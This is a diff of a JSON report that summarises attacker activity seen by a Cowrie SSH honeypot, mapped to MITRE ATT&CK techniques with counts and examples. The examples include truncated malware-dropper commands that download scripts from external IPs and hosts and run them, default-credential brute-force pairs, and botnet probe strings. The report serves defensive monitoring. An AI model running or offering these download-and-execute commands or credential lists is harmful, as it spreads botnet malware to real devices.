@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-10 20:03:12",
+  "generated": "2026-09-10 21:04:12",
   "totals": {
-    "commands": 1243,
-    "login_failed": 2995,
-    "login_success": 322,
-    "sessions": 3401
+    "commands": 1560,
+    "login_failed": 3097,
+    "login_success": 410,
+    "sessions": 3528
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2995,
+      "count": 3097,
       "examples": [
         "root / xc3511",
         "root / 54321",
@@ -21,14 +21,14 @@
         "root / root"
       ],
       "first": "2026-09-10T00:00:10.861058Z",
-      "last": "2026-09-10T20:03:01.148433Z",
-      "unique_ips": 150
+      "last": "2026-09-10T21:00:05.567184Z",
+      "unique_ips": 152
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 322,
+      "count": 410,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "enable\\x00 / system\\x00",
@@ -37,14 +37,14 @@
         "nobody / password"
       ],
       "first": "2026-09-10T00:00:11.554236Z",
-      "last": "2026-09-10T20:03:04.067446Z",
-      "unique_ips": 82
+      "last": "2026-09-10T20:56:58.777992Z",
+      "unique_ips": 84
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 222,
+      "count": 252,
       "examples": [
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
         "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh ",
@@ -53,14 +53,14 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-10T00:41:47.834125Z",
-      "last": "2026-09-10T19:49:04.129469Z",
-      "unique_ips": 23
+      "last": "2026-09-10T20:57:40.108284Z",
+      "unique_ips": 25
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 70,
+      "count": 78,
       "examples": [
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
         "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh ",
@@ -69,8 +69,22 @@
         "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s"
       ],
       "first": "2026-09-10T00:41:47.834125Z",
-      "last": "2026-09-10T19:49:04.129469Z",
-      "unique_ips": 21
+      "last": "2026-09-10T20:57:40.108284Z",
+      "unique_ips": 23
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 19,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "id"
+      ],
+      "first": "2026-09-10T03:09:55.964523Z",
+      "last": "2026-09-10T20:57:03.060008Z",
+      "unique_ips": 19
     },
     {
       "id": "T1082",
@@ -87,20 +101,6 @@
       "first": "2026-09-10T02:39:32.292392Z",
       "last": "2026-09-10T19:18:10.310985Z",
       "unique_ips": 15
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 17,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "id"
-      ],
-      "first": "2026-09-10T03:09:55.964523Z",
-      "last": "2026-09-10T19:48:28.689750Z",
-      "unique_ips": 17
     },
     {
       "id": "T1059.004",
@@ -231,43 +231,43 @@
   "unmapped": [
     [
       "shell",
-      249
+      336
     ],
     [
       "sh",
-      248
+      335
     ],
     [
       "system",
-      235
+      322
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      96
+      112
     ],
     [
       "enable",
-      18
+      20
     ],
     [
       "cd /proc && cat self/cmdline",
+      18
+    ],
+    [
+      "linuxshell",
+      16
+    ],
+    [
+      "enablelinuxshell",
+      16
+    ],
+    [
+      "ping ;sh",
       16
     ],
     [
       "/bin/busybox",
       16
-    ],
-    [
-      "linuxshell",
-      14
-    ],
-    [
-      "enablelinuxshell",
-      14
-    ],
-    [
-      "ping ;sh",
-      14
     ],
     [
       "/bin/busybox BOTNET",
